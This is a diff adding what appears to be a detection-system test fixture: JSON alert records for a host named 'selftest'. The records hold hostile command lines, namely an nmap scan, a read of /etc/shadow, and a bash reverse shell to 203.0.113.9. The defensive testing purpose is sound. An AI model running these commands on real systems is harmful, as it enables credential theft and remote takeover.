@@ -1,0 +1,36 @@
+[
+  {
+    "ts": "2026-11-16T08:33:28.500Z",
+    "severity": "high",
+    "rule_id": "exec-recon-nmap",
+    "argv": "nmap -sT 203.0.113.10",
+    "mitre": "T1046",
+    "id": "x1",
+    "agent_id": "h1",
+    "hostname": "selftest"
+  },
+  {
+    "ts": "2026-11-16T08:33:21.200Z",
+    "severity": "high",
+    "rule_id": "firstseen/host-alpha",
+    "argv": "context digest",
+    "id": "x2"
+  },
+  {
+    "ts": "2026-11-16T08:33:32.500Z",
+    "severity": "critical",
+    "rule_id": "exec-cred-shadow-read",
+    "argv": "cat /etc/shadow",
+    "mitre": "T1003.008",
+    "id": "x3",
+    "agent_id": "h1",
+    "hostname": "selftest"
+  },
+  {
+    "ts": "2026-11-16T08:33:44.500Z",
+    "severity": "medium",
+    "rule_id": "intent/reverse_shell",
+    "argv": "bash -i >& /dev/tcp/203.0.113.9/9444",
+    "id": "x4"
+  }
+]
